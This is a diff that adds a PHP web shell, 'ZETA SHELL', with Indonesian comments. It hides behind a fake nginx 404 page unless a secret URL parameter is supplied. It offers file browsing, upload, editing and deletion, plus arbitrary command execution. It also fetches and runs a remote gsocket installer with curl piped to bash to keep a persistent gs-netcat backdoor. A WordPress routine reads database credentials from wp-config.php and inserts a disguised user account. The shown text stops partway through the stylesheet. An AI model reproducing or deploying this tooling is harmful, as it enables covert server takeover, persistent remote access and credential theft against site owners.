@@ -1,0 +1,1122 @@
+<?php
+// ============================================
+// CEK PARAMETER AKSES - PALING ATAS
+// ============================================
+if (!isset($_GET['zetaxploiter'])) {
+    header('HTTP/1.0 404 Not Found');
+    echo '<!DOCTYPE html>
+<html>
+<head><title>404 Not Found</title></head>
+<body bgcolor="white">
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>';
+    exit;
+}
+
+// ============================================
+// KONFIGURASI SESSION
+// ============================================
+session_name('ZETAX');
+session_set_cookie_params([
+    'lifetime' => 86400,
+    'path' => '/',
+    'domain' => $_SERVER['HTTP_HOST'] ?? '',
+    'secure' => false,
+    'httponly' => true,
+    'samesite' => 'Lax'
+]);
+session_start();
+
+if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
+    $_SESSION['last_activity'] = time();
+}
+
+if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > 1800)) {
+    session_destroy();
+    session_start();
+    $_SESSION['logged_in'] = false;
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?zetaxploiter');
+    exit;
+}
+
+define('BASE_DIR', '/');
+define('MAX_FILE_SIZE', 50 * 1024 * 1024);
+define('ALLOWED_EXTENSIONS', ['txt', 'php', 'html', 'css', 'js', 'jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx', 'zip']);
+
+$valid_username = 'admin';
+$valid_password = 'password123';
+
+// ============================================
+// CEK LOGIN
+// ============================================
+if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
+        if ($_POST['username'] === $valid_username && $_POST['password'] === $valid_password) {
+            $_SESSION['logged_in'] = true;
+            $_SESSION['username'] = $_POST['username'];
+            $_SESSION['last_activity'] = time();
+            header('Location: ' . $_SERVER['PHP_SELF'] . '?zetaxploiter');
+            exit;
+        } else {
+            $error = 'Username atau password salah!';
+        }
+    }
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>LOGIN</title>
+        <style>
+            * { margin:0; padding:0; box-sizing:border-box; }
+            body { background:#2a1f1a; font-family:'Courier New',monospace; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }
+            .login-box { background:#1e1613; border:2px solid #4a3a33; padding:30px; max-width:350px; width:100%; }
+            .login-box h1 { text-align:center; font-size:22px; margin-bottom:15px; text-transform:uppercase; letter-spacing:2px; color:#b8a090; }
+            .login-box hr { border:1px solid #4a3a33; margin-bottom:15px; }
+            .login-box .error { color:#c06040; text-align:center; font-weight:bold; margin-bottom:10px; }
+            .login-box label { display:block; font-weight:bold; margin-top:10px; color:#b8a090; }
+            .login-box input[type="text"], .login-box input[type="password"] { width:100%; padding:8px; border:2px solid #4a3a33; background:#1a1310; color:#d4c4b4; font-family:'Courier New',monospace; font-size:14px; margin-top:3px; }
+            .login-box input[type="submit"] { width:100%; padding:10px; background:#3a2a24; border:2px solid #4a3a33; color:#b8a090; font-family:'Courier New',monospace; font-weight:bold; font-size:16px; cursor:pointer; margin-top:15px; }
+            .login-box input[type="submit"]:hover { background:#4a3a33; }
+        </style>
+    </head>
+    <body>
+        <div class="login-box">
+            <h1>LOGIN</h1>
+            <hr>
+            <?php if (isset($error)): ?>
+                <div class="error"><?= htmlspecialchars($error) ?></div>
+            <?php endif; ?>
+            <form method="POST">
+                <label>USERNAME</label>
+                <input type="text" name="username" required>
+                <label>PASSWORD</label>
+                <input type="password" name="password" required>
+                <input type="submit" value="MASUK">
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// ============================================
+// FUNGSI-FUNGSI
+// ============================================
+function sanitize_path($path) {
+    $path = realpath($path);
+    if ($path === false) return false;
+    return $path;
+}
+
+function get_directory($dir) {
+    $dir = isset($_GET['dir']) ? $_GET['dir'] : '/';
+    $dir = sanitize_path($dir);
+    return $dir ?: '/';
+}
+
+function format_size($bytes) {
+    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
+    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
+    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
+    return $bytes . ' B';
+}
+
+function get_file_type($filename) {
+    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+    $types = [
+        'php' => 'PHP', 'html' => 'HTML', 'css' => 'CSS', 'js' => 'JS',
+        'jpg' => 'IMG', 'jpeg' => 'IMG', 'png' => 'IMG', 'gif' => 'IMG',
+        'pdf' => 'PDF', 'doc' => 'DOC', 'docx' => 'DOC', 'txt' => 'TXT',
+        'zip' => 'ZIP', 'rar' => 'RAR'
+    ];
+    return $types[$ext] ?? 'FILE';
+}
+
+function get_permissions($path) {
+    $perms = fileperms($path);
+    $info = '';
+    $info .= ($perms & 0x0100) ? 'r' : '-';
+    $info .= ($perms & 0x0080) ? 'w' : '-';
+    $info .= ($perms & 0x0040) ? 'x' : '-';
+    $info .= ($perms & 0x0020) ? 'r' : '-';
+    $info .= ($perms & 0x0010) ? 'w' : '-';
+    $info .= ($perms & 0x0008) ? 'x' : '-';
+    $info .= ($perms & 0x0004) ? 'r' : '-';
+    $info .= ($perms & 0x0002) ? 'w' : '-';
+    $info .= ($perms & 0x0001) ? 'x' : '-';
+    return $info;
+}
+
+function get_file_color($path) {
+    if (is_writable($path) && is_readable($path)) return '#6a8a5a';
+    elseif (!is_writable($path) && is_readable($path)) return '#b06040';
+    elseif (!is_readable($path)) return '#8a6a4a';
+    return '#b8a090';
+}
+
+function get_system_info() {
+    return [
+        'os' => php_uname('s') . ' ' . php_uname('r'),
+        'hostname' => php_uname('n'),
+        'php' => phpversion(),
+        'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
+        'disabled' => ini_get('disable_functions') ?: 'None'
+    ];
+}
+
+function unzip_file($zip_path, $extract_to) {
+    if (!class_exists('ZipArchive')) return ['error' => 'ZipArchive tidak tersedia'];
+    $zip = new ZipArchive();
+    if ($zip->open($zip_path) === true) {
+        $zip->extractTo($extract_to);
+        $zip->close();
+        return ['success' => 'Ekstrak berhasil'];
+    }
+    return ['error' => 'Gagal membuka ZIP'];
+}
+
+function execute_command($cmd, $cwd) {
+    $cmd = trim($cmd ?? '');
+    if ($cmd === '') return ['output' => ''];
+    
+    if (strpos($cmd, 'cd ') === 0) {
+        $dir = trim(substr($cmd, 3) ?? '');
+        if ($dir === '..') $new_dir = dirname($cwd);
+        elseif ($dir === '~' || $dir === '') $new_dir = getenv('HOME') ?: '/';
+        elseif (strpos($dir, '/') === 0 || strpos($dir, ':') === 1) $new_dir = $dir;
+        else $new_dir = $cwd . DIRECTORY_SEPARATOR . $dir;
+        if (is_dir($new_dir)) {
+            return ['cd_success' => realpath($new_dir)];
+        }
+        return ['output' => 'cd: ' . $dir . ': No such directory'];
+    }
+    if ($cmd === 'pwd') return ['output' => $cwd];
+    if ($cmd === 'ls' || $cmd === 'dir') {
+        $items = scandir($cwd);
+        $result = '';
+        foreach ($items as $item) {
+            if ($item === '.' || $item === '..') continue;
+            $path = $cwd . DIRECTORY_SEPARATOR . $item;
+            $perm = get_permissions($path);
+            $size = is_dir($path) ? '-' : format_size(filesize($path));
+            $result .= $perm . ' ' . str_pad($size, 10) . ' ' . $item . "\n";
+        }
+        return ['output' => $result ?: '(empty)'];
+    }
+    if ($cmd === 'clear' || $cmd === 'cls') return ['clear' => true];
+    if ($cmd === 'help' || $cmd === '?') {
+        return ['output' => "cd | pwd | ls | clear | help | cat | rm | mkdir | touch | chmod | exit"];
+    }
+    if (strpos($cmd, 'cat ') === 0) {
+        $file = trim(substr($cmd, 4) ?? '');
+        $path = $cwd . DIRECTORY_SEPARATOR . basename($file);
+        if (file_exists($path) && is_file($path)) {
+            return ['output' => file_get_contents($path)];
+        }
+        return ['output' => 'cat: ' . $file . ': No such file'];
+    }
+    if (strpos($cmd, 'rm ') === 0) {
+        $file = trim(substr($cmd, 3) ?? '');
+        $path = $cwd . DIRECTORY_SEPARATOR . basename($file);
+        if (file_exists($path) && is_file($path)) {
+            unlink($path);
+            return ['output' => 'removed: ' . $file];
+        }
+        return ['output' => 'rm: ' . $file . ': No such file'];
+    }
+    if (strpos($cmd, 'mkdir ') === 0) {
+        $dir = trim(substr($cmd, 6) ?? '');
+        $path = $cwd . DIRECTORY_SEPARATOR . basename($dir);
+        if (!file_exists($path)) {
+            mkdir($path, 0755, true);
+            return ['output' => 'created: ' . $dir];
+        }
+        return ['output' => 'mkdir: ' . $dir . ': File exists'];
+    }
+    if (strpos($cmd, 'touch ') === 0) {
+        $file = trim(substr($cmd, 6) ?? '');
+        $path = $cwd . DIRECTORY_SEPARATOR . basename($file);
+        if (!file_exists($path)) file_put_contents($path, '');
+        else touch($path);
+        return ['output' => 'touched: ' . $file];
+    }
+    if (strpos($cmd, 'chmod ') === 0) {
+        $parts = explode(' ', $cmd, 3);
+        if (count($parts) < 3) return ['output' => 'Usage: chmod <file> <permission>'];
+        $path = $cwd . DIRECTORY_SEPARATOR . basename($parts[1] ?? '');
+        if (file_exists($path)) {
+            chmod($path, octdec($parts[2] ?? ''));
+            return ['output' => 'chmod: ' . $parts[1] . ' -> ' . $parts[2]];
+        }
+        return ['output' => 'chmod: ' . $parts[1] . ': No such file'];
+    }
+    if ($cmd === 'exit') return ['exit' => true];
+    
+    $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
+    $process = proc_open($cmd, $descriptorspec, $pipes, $cwd);
+    if (is_resource($process)) {
+        $output = stream_get_contents($pipes[1]);
+        $error = stream_get_contents($pipes[2]);
+        fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
+        proc_close($process);
+        return ['output' => $output ?: $error ?: '(no output)'];
+    }
+    return ['output' => $cmd . ': command not found'];
+}
+
+function gs_get_home() {
+    $home = getenv('HOME');
+    return empty($home) ? '/home/' . get_current_user() : $home;
+}
+function gs_gen_secret() {
+    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $s = '';
+    for ($i = 0; $i < 32; $i++) $s .= $chars[rand(0, 61)];
+    return $s;
+}
+function gs_get_secret() {
+    $home = gs_get_home();
+    $file = $home . '/.gs_secret';
+    if (file_exists($file)) return trim(file_get_contents($file) ?? '');
+    return null;
+}
+function gs_save_secret($s) {
+    $file = gs_get_home() . '/.gs_secret';
+    file_put_contents($file, $s);
+    chmod($file, 0600);
+}
+function gs_is_installed() {
+    $check = shell_exec('which gs-netcat 2>/dev/null');
+    return !empty(trim($check ?? ''));
+}
+function gs_is_running() {
+    $ps = shell_exec('ps aux | grep gs-netcat | grep -v grep 2>/dev/null');
+    return !empty(trim($ps ?? ''));
+}
+function gs_run_cmd($cmd) {
+    $output = array();
+    exec($cmd . ' 2>&1', $output, $return);
+    return implode("\n", $output);
+}
+function gs_install() {
+    $secret = gs_gen_secret();
+    gs_save_secret($secret);
+    $output = "=== GSOCKET INSTALL ===\nUser: " . get_current_user() . "\nHOME: " . gs_get_home() . "\nSecret: $secret\n\n";
+    $result = gs_run_cmd('bash -c "$(curl -fsSL https://gsocket.io/x)"');
+    $output .= $result . "\n";
+    if (gs_is_installed()) {
+        gs_run_cmd("nohup gs-netcat -s '{$secret}' -i > /dev/null 2>&1 &");
+        $output .= "\nSUCCESS! Gsocket running with secret: {$secret}\n";
+    }
+    return $output;
+}
+function gs_start() {
+    $secret = gs_get_secret();
+    if ($secret) { gs_run_cmd("nohup gs-netcat -s '{$secret}' -i > /dev/null 2>&1 &"); return "Started!"; }
+    return "No secret. Install first.";
+}
+function gs_stop() {
+    gs_run_cmd('pkill -f gs-netcat 2>/dev/null');
+    return "Stopped!";
+}
+function gs_status() {
+    return ['installed' => gs_is_installed(), 'running' => gs_is_running(), 'secret' => gs_get_secret(), 'user' => get_current_user()];
+}
+
+function wp_find_config($base, $depth) {
+    if ($depth > 6) return null;
+    if (!is_dir($base)) return null;
+    $f = $base . DIRECTORY_SEPARATOR . 'wp-config.php';
+    if (is_file($f)) return $f;
+    $dh = @opendir($base);
+    if (!$dh) return null;
+    while (false !== ($e = readdir($dh))) {
+        if ($e === '.' || $e === '..' || $e[0] === '.') continue;
+        $p = $base . DIRECTORY_SEPARATOR . $e;
+        if (is_dir($p) && !is_link($p)) {
+            $r = wp_find_config($p, $depth + 1);
+            if ($r) { closedir($dh); return $r; }
+        }
+    }
+    closedir($dh);
+    return null;
+}
+function wp_pick($src, $key) {
+    if (preg_match("/define\s*\(\s*['\"]" . $key . "['\"]\s*,\s*['\"]((?:[^'\"\\\\]|\\\\.)*)['\"]/i", $src, $m)) {
+        return stripcslashes($m[1] ?? '');
+    }
+    return null;
+}
+function wp_generate_name() {
+    $first = ['James','John','Robert','Michael','William','David','Richard','Joseph','Thomas'];
+    $last = ['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis'];
+    $f = $first[array_rand($first)];
+    $l = $last[array_rand($last)];
+    return ['user' => $f . $l, 'email' => strtolower($f) . '.' . strtolower($l) . rand(10,99) . '@gmail.com', 'display' => $f . ' ' . $l];
+}
+function wp_generate_password($length = 8) {
+    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $pass = '';
+    for ($i = 0; $i < $length; $i++) $pass .= $chars[rand(0, 61)];
+    return $pass;
+}
+function wp_create_user() {
+    $name = wp_generate_name();
+    $NEW_USER = $name['user'];
+    $NEW_EMAIL = $name['email'];
+    $DISPLAY_NAME = $name['display'];
+    $NEW_PASS = wp_generate_password(8);
+    
+    $roots = array_filter(array_unique([$_SERVER['DOCUMENT_ROOT'] ?? '', __DIR__, dirname(__DIR__), getenv('HOME')]));
+    $wp_config = null;
+    foreach ($roots as $r) {
+        $real = @realpath($r);
+        if ($real) { $wp_config = wp_find_config($real, 0); if ($wp_config) break; }
+    }
+    if (!$wp_config) return ['error' => 'wp-config.php tidak ditemukan'];
+    
+    $src = @file_get_contents($wp_config);
+    if (!$src) return ['error' => 'Tidak bisa baca wp-config'];
+    
+    $DB_NAME = wp_pick($src, 'DB_NAME');
+    $DB_USER = wp_pick($src, 'DB_USER');
+    $DB_PASS = wp_pick($src, 'DB_PASSWORD');
+    $DB_HOST = wp_pick($src, 'DB_HOST') ?: 'localhost';
+    $CHARSET = wp_pick($src, 'DB_CHARSET') ?: 'utf8';
+    $PREFIX = 'wp_';
+    if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $src, $m)) $PREFIX = $m[1] ?? 'wp_';
+    
+    if (!$DB_NAME || $DB_USER === null) return ['error' => 'Gagal parse DB credentials'];
+    
+    $mysqli = @new mysqli($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME);
+    if ($mysqli->connect_errno) return ['error' => 'DB Error: ' . $mysqli->connect_error];
+    @$mysqli->set_charset($CHARSET);
+    
+    $row = $mysqli->query("SELECT option_value FROM `{$PREFIX}options` WHERE option_name='siteurl' LIMIT 1")->fetch_row();
+    $site_url = $row ? $row[0] : '';
+    $row = $mysqli->query("SELECT option_value FROM `{$PREFIX}options` WHERE option_name='blogname' LIMIT 1")->fetch_row();
+    $blog_name = $row ? $row[0] : '';
+    
+    $phpass_file = dirname($wp_config) . '/wp-includes/class-phpass.php';
+    if (!is_file($phpass_file)) {
+        foreach (['wordpress','wp'] as $sub) {
+            $alt = dirname($wp_config) . '/' . $sub . '/wp-includes/class-phpass.php';
+            if (is_file($alt)) { $phpass_file = $alt; break; }
+        }
+    }
+    if (!is_file($phpass_file)) return ['error' => 'class-phpass.php tidak ditemukan'];
+    require_once $phpass_file;
+    $hasher = new PasswordHash(8, true);
+    $hashed = $hasher->HashPassword($NEW_PASS);
+    
+    $user_login_esc = $mysqli->real_escape_string($NEW_USER);
+    $user_email_esc = $mysqli->real_escape_string($NEW_EMAIL);
+    $hashed_esc = $mysqli->real_escape_string($hashed);
+    
+    $exist = $mysqli->query("SELECT ID FROM `{$PREFIX}users` WHERE user_login='{$user_login_esc}' OR user_email='{$user_email_esc}' LIMIT 1");
+    if ($exist && $row = $exist->fetch_assoc()) {
+        $user_id = (int)$row['ID'];
+        $mysqli->query("UPDATE `{$PREFIX}users` SET user_pass='{$hashed_esc}', user_email='{$user_email_esc}' WHERE ID={$user_id}");
+        $status = 'User sudah ada -> password & email di-reset.';
+    } else {
+        $now = date('Y-m-d H:i:s');
+        $nice = $mysqli->real_escape_string(strtolower(preg_replace('/[^a-zA-Z0-9]+/', '-', $NEW_USER)));
+        $display_esc = $mysqli->real_escape_string($DISPLAY_NAME);
+        $mysqli->query("INSERT INTO `{$PREFIX}users` (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name)
+                    VALUES ('{$user_login_esc}','{$hashed_esc}','{$nice}','{$user_email_esc}','{$now}',0,'{$display_esc}')");
+        $user_id = (int)$mysqli->insert_id;
+        $status = 'User baru dibuat.';
+    }
+    $mysqli->close();
+    return ['status' => $status, 'site' => $blog_name, 'url' => $site_url, 'username' => $NEW_USER, 'password' => $NEW_PASS, 'email' => $NEW_EMAIL];
+}
+
+// ============================================
+// INISIALISASI
+// ============================================
+$current_dir = get_directory('/');
+$error = '';
+$success = '';
+$is_editing = false;
+$content = '';
+
+// ============================================
+// PROSES POST & GET
+// ============================================
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
+    $file = $_FILES['file'];
+    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+    if ($file['size'] > MAX_FILE_SIZE) {
+        $error = 'File terlalu besar!';
+    } elseif (!in_array($ext, ALLOWED_EXTENSIONS)) {
+        $error = 'Ekstensi tidak diizinkan!';
+    } else {
+        $target = $current_dir . DIRECTORY_SEPARATOR . basename($file['name']);
+        if (move_uploaded_file($file['tmp_name'], $target)) {
+            $success = 'Upload berhasil!';
+        } else {
+            $error = 'Gagal upload!';
+        }
+    }
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['unzip_file'])) {
+    $zip_file = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['unzip_file'] ?? '');
+    if (file_exists($zip_file) && is_file($zip_file)) {
+        $result = unzip_file($zip_file, $current_dir);
+        if (isset($result['success'])) $success = $result['success'];
+        else $error = $result['error'];
+    } else {
+        $error = 'File ZIP tidak ditemukan!';
+    }
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_dir'])) {
+    $dirname = trim($_POST['dirname'] ?? '');
+    if (!empty($dirname)) {
+        $new_dir = $current_dir . DIRECTORY_SEPARATOR . basename($dirname);
+        if (!file_exists($new_dir)) { mkdir($new_dir, 0755, true); $success = 'Direktori dibuat!'; }
+        else $error = 'Sudah ada!';
+    }
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_file'])) {
+    $filename = trim($_POST['filename'] ?? '');
+    if (!empty($filename)) {
+        $new_file = $current_dir . DIRECTORY_SEPARATOR . basename($filename);
+        if (!file_exists($new_file)) { file_put_contents($new_file, ''); $success = 'File dibuat!'; }
+        else $error = 'Sudah ada!';
+    }
+}
+
+if (isset($_GET['edit'])) {
+    $file_path = $current_dir . DIRECTORY_SEPARATOR . basename($_GET['edit'] ?? '');
+    if (file_exists($file_path) && is_file($file_path)) {
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
+            file_put_contents($file_path, $_POST['content']);
+            $success = 'Disimpan!';
+            header('Location: ?dir=' . urlencode($current_dir) . '&zetaxploiter');
+            exit;
+        }
+        $content = file_get_contents($file_path);
+        $is_editing = true;
+    } else {
+        header('Location: ?dir=' . urlencode($current_dir) . '&zetaxploiter');
+        exit;
+    }
+}
+
+if (isset($_GET['delete'])) {
+    $target = $current_dir . DIRECTORY_SEPARATOR . basename($_GET['delete'] ?? '');
+    if (file_exists($target)) {
+        if (is_file($target)) unlink($target);
+        else rmdir($target);
+        $success = 'Dihapus!';
+    }
+    header('Location: ?dir=' . urlencode($current_dir) . '&zetaxploiter');
+    exit;
+}
+
+if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
+    $old = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['rename_old'] ?? '');
+    $new = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['rename_new'] ?? '');
+    if (file_exists($old) && !file_exists($new) && !empty($_POST['rename_new'])) {
+        rename($old, $new);
+        $success = 'Diubah!';
+    } else {
+        $error = 'Gagal rename!';
+    }
+    header('Location: ?dir=' . urlencode($current_dir) . '&zetaxploiter');
+    exit;
+}
+
+if (isset($_POST['touch_file'])) {
+    $file = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['touch_file'] ?? '');
+    if (!empty($_POST['touch_file'])) {
+        if (file_exists($file)) {
+            touch($file);
+            $success = 'Timestamp diupdate!';
+        } else {
+            file_put_contents($file, '');
+            $success = 'File baru dibuat!';
+        }
+    }
+    header('Location: ?dir=' . urlencode($current_dir) . '&zetaxploiter');
+    exit;
+}
+
+if (isset($_GET['download'])) {
+    $file = $current_dir . DIRECTORY_SEPARATOR . basename($_GET['download'] ?? '');
+    if (file_exists($file) && is_file($file)) {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+        readfile($file);
+        exit;
+    }
+}
+
+if (isset($_POST['chmod_file']) && isset($_POST['chmod_perm'])) {
+    $file = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['chmod_file'] ?? '');
+    if (file_exists($file) && !empty($_POST['chmod_perm'])) {
+        $perm = octdec($_POST['chmod_perm']);
+        if (chmod($file, $perm)) {
+            $success = 'CHMOD berhasil! ' . $_POST['chmod_file'] . ' -> ' . $_POST['chmod_perm'];
+        } else {
+            $error = 'Gagal CHMOD!';
+        }
+    } else {
+        $error = 'File tidak ditemukan!';
+    }
+    header('Location: ?dir=' . urlencode($current_dir) . '&zetaxploiter');
+    exit;
+}
+
+$gs_msg = '';
+if (isset($_GET['gs_action'])) {
+    $gs_action = $_GET['gs_action'];
+    if ($gs_action == 'install') $gs_msg = gs_install();
+    elseif ($gs_action == 'start') $gs_msg = gs_start();
+    elseif ($gs_action == 'stop') $gs_msg = gs_stop();
+    elseif ($gs_action == 'find') {
+        $found = gs_get_secret();
+        $gs_msg = $found ? "Secret: " . $found : "Secret tidak ditemukan.";
+    }
+    elseif ($gs_action == 'status') { header('Content-Type: application/json'); echo json_encode(gs_status()); exit; }
+}
+
+$wp_result = '';
+if (isset($_GET['wp_action']) && $_GET['wp_action'] == 'create') $wp_result = wp_create_user();
+
+$terminal_output = '';
+$terminal_dir = $current_dir;
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['terminal_cmd'])) {
+    $cmd = trim($_POST['terminal_cmd'] ?? '');
+    if (!empty($cmd)) {
+        $result = execute_command($cmd, $current_dir);
+        if (isset($result['cd_success'])) { $_SESSION['terminal_new_dir'] = $result['cd_success']; $terminal_dir = $result['cd_success']; }
+        elseif (isset($result['clear'])) { $_SESSION['terminal_history'] = []; $_SESSION['terminal_clear'] = true; }
+        elseif (isset($result['exit'])) { $_SESSION['terminal_history'] = []; $_SESSION['terminal_exit'] = true; }
+        else { $_SESSION['terminal_history'][] = ['cmd' => $cmd, 'output' => $result['output'] ?? '', 'dir' => $current_dir]; }
+        $_SESSION['terminal_show'] = true;
+    }
+}
+
+if (isset($_SESSION['terminal_new_dir'])) { $terminal_dir = $_SESSION['terminal_new_dir']; unset($_SESSION['terminal_new_dir']); }
+if (isset($_SESSION['terminal_clear'])) { unset($_SESSION['terminal_clear']); }
+if (isset($_SESSION['terminal_exit'])) { unset($_SESSION['terminal_exit']); $_SESSION['terminal_show'] = false; }
+if (!isset($_SESSION['terminal_show'])) $_SESSION['terminal_show'] = false;
+
+$show_terminal = $_SESSION['terminal_show'];
+$history = $_SESSION['terminal_history'] ?? [];
+$sysinfo = get_system_info();
+
+if (isset($_GET['toggle_terminal'])) { $_SESSION['terminal_show'] = !$_SESSION['terminal_show']; header('Location: ?dir=' . urlencode($current_dir) . '&zetaxploiter'); exit; }
+
+$gs_installed = gs_is_installed();
+$gs_running = gs_is_running();
+$gs_secret = gs_get_secret();
+
+$show_rename_popup = isset($_GET['rename']);
+$rename_file = $show_rename_popup ? htmlspecialchars($_GET['rename'] ?? '') : '';
+$show_touch_popup = isset($_GET['touch_popup']);
+$touch_file = $show_touch_popup ? htmlspecialchars($_GET['touch_popup'] ?? '') : '';
+
+$show_upload = isset($_GET['show_upload']) ? $_GET['show_upload'] : '0';
+$show_unzip = isset($_GET['show_unzip']) ? $_GET['show_unzip'] : '0';
+$show_createdir = isset($_GET['show_createdir']) ? $_GET['show_createdir'] : '0';
+$show_createfile = isset($_GET['show_createfile']) ? $_GET['show_createfile'] : '0';
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZETA SHELL</title>
+<style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { background:#1a2b4c; font-family:'Courier New',monospace; padding:10px; color:#c8d6e5; }
+    
+    /* Tabel Utama */
+    table { border-collapse:collapse; width:100%; background:#1e375a; border:2px solid #e3c872; }
+    td { padding:6px; border:1px solid #2c4870; vertical-align:top; }
+    
+    /* Header */
+    .header { background:#233d62; color:#e3c872; padding:10px; font-weight:bold; font-size:18px; letter-spacing:2px; border-bottom:2px solid #e3c872; }
+    .header a { color:#e3c872; text-decoration:none; }
+    .header a:hover { text-decoration:underline; color:#f0db8f; }
+    
+    /* Menu & Tools */
+    .menu { background:#1a2b4c; border:2px solid #2c4870; padding:8px; margin:8px 0; }
+    .menu-tools { display:flex; flex-wrap:wrap; gap:4px 12px; }
+    .menu-tools a { color:#6ab04c; text-decoration:underline; cursor:pointer; font-size:28px; }
+    .menu-tools a:hover { background:#2c4870; color:#c8d6e5; }
+    
+    /* Breadcrumb (Navigasi) */
+    .breadcrumb { background:#15243f; color:#e3c872; border:2px solid #2c4870; padding:6px 10px; margin:8px 0; font-size:12px; overflow-x:auto; white-space:nowrap; }
+    .breadcrumb a { color:#6ab04c; text-decoration:underline; }
+    .breadcrumb a:hover { background:#2c4870; color:#f0db8f; }
+    .breadcrumb .sep { color:#2c4870; margin:0 2px; }
+    .breadcrumb .shortcut { color:#e3c872; }
+    
+    /* Baris File & Folder */
+    .file-row { background:#1a2b4c; }
+    .file-row:hover { background:#2c4870; }
+    .file-row-alt { background:#1e375a; }
+    .file-row-alt:hover { background:#2c4870; }
+    .dir { font-weight:bold; color:#6ab04c; }
+    .dir a { color:#6ab04c; text-decoration:none; }
+    .dir a:hover { text-decoration:underline; color:#7ed15e; }
+    
+    /* Aksi & Tombol */
+    .actions select, .actions input { font-family:'Courier New',monospace; font-size:15px; padding:1px 2px; border:1px solid #2c4870; background:#1a2b4c; color:#c8d6e5; }
+    .actions select { width:70px; }
+    .actions input[type="submit"] { background:#2c4870; cursor:pointer; padding:1px 6px; border:1px solid #e3c872; }
+    .actions input[type="submit"]:hover { background:#3a5a82; color:#f0db8f; }
+    
+    /* Input Umum */
+    input { font-family:'Courier New',monospace; border:2px solid #2c4870; background:#1a2b4c; color:#c8d6e5; padding:4px; }
+    input[type="text"] { flex:1; }
+    input[type="file"] { flex:1; }
+    input[type="submit"], .btn { background:#2c4870; border:2px solid #e3c872; padding:4px 15px; cursor:pointer; font-weight:bold; color:#e3c872; }
+    input[type="submit"]:hover, .btn:hover { background:#3a5a82; color:#f0db8f; }
+    
+    /* Alert / Notifikasi */
+    .alert { padding:8px; border:2px solid #2c4870; margin:8px 0; font-weight:bold; }
+    .alert-success { background:#142c1a; color:#6ab04c; border-color:#2a4a2a; }
+    .alert-error { background:#2c1a1a; color:#eb4d4b; border-color:#4a2a2a; }
+    
+    /* Editor Text */
+    .editor { background:#1a2b4c; border:2px solid #2c4870; padding:12px; margin:8px 0; }
+    .editor textarea { width:100%; height:350px; font-family:'Courier New',monospace; border:2px solid #2c4870; padding:8px; background:#15243f; color:#c8d6e5; }
+    .editor textarea:focus { outline:none; border-color:#e3c872; }
+    
+    /* Footer */
+    .footer { margin-top:15px; text-align:center; font-size:11px; border-top:2px solid #2c4870; padding-top:8px; color: #f4f4f4; }
+    .status-bar { background:#15243f; color:#e3c872; padding:3px 9px; font-size:11px; margin-top:8px; overflow-x:auto; }
+    
+    /* Terminal */
+    .terminal { background:#15243f; color:#6ab04c; padding:8px; margin:8px 0; border:2px solid #2c4870; max-height:400px; overflow-y:auto; font-size:12px; }
+    .terminal-line { display:flex; align-items:center; gap:6px; flex-wrap:wrap; }
+    .terminal-prompt { color:#6ab04c; font-weight:bold; white-space:nowrap; }
+    .terminal-input { flex:1; min-width:100px; background:#15243f; color:#c8d6e5; border:none; padding:2px 0; font-family:'Courier New',monospace; font-size:12px; outline:none; border-bottom:1px solid #2c4870; }
+    .terminal-input::placeholder { color:#2c4870; }
+    .terminal-output { white-space:pre-wrap; word-wrap:break-word; margin:2px 0; color:#c8d6e5; }
+    .terminal-cmd { color:#f0db8f; }
+    .terminal-history { color:#2c4870; font-size:10px; margin-top:4px; border-top:1px solid #2c4870; padding-top:4px; }
+    
+    /* System Info */
+    .sysinfo { background:#15243f; color:#e3c872; padding:8px; margin:8px 0; border:2px solid #2c4870; font-size:11px; overflow-x:auto; }
+    .sysinfo td { border:none; padding:2px 5px; background:transparent; color:#c8d6e5; }
+    .sysinfo .label { color:#2c4870; width:140px; }
+    
+    /* Permission Box */
